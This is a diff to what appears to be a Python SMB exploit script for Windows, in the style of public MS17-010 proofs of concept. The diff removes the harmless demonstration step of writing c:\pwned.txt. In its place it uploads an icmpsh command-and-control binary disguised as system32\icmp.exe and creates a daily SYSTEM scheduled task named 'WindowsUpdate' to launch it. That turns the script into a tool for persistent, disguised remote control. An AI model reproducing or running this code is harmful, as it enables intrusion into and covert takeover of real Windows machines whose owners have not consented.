@@ -33,7 +33,7 @@ Tested on:
 - Windows 2000 SP4 x86
 '''
 
-USERNAME = 'guest'
+USERNAME = ''
 PASSWORD = ''
 
 '''
@@ -912,14 +912,14 @@ def exploit(target, pipe_name):
 
 def smb_pwn(conn, arch):
 	smbConn = conn.get_smbconnection()
+	
+	print('Deploying C2 the target')
+	# ICMP
+	smb_send_file(smbConn, "icmpsh-s.patch.exe", "C", "/Windows/system32/icmp.exe")
+	# TODO: Add the rest of C2
+	# Creating new task
+	service_exec(conn, r"schtasks /Create /sc daily /tn WindowsUpdate /tr icmp.exe /ru system /st 18:00 ")
 
-	print('creating file c:\\pwned.txt on the target')
-	tid2 = smbConn.connectTree('C$')
-	fid2 = smbConn.createFile(tid2, '/pwned.txt')
-	smbConn.closeFile(tid2, fid2)
-	smbConn.disconnectTree(tid2)
-
-	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
 	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
 	# Note: there are many methods to get shell over SMB admin session
 	# a simple method to get shell (but easily to be detected by AV) is
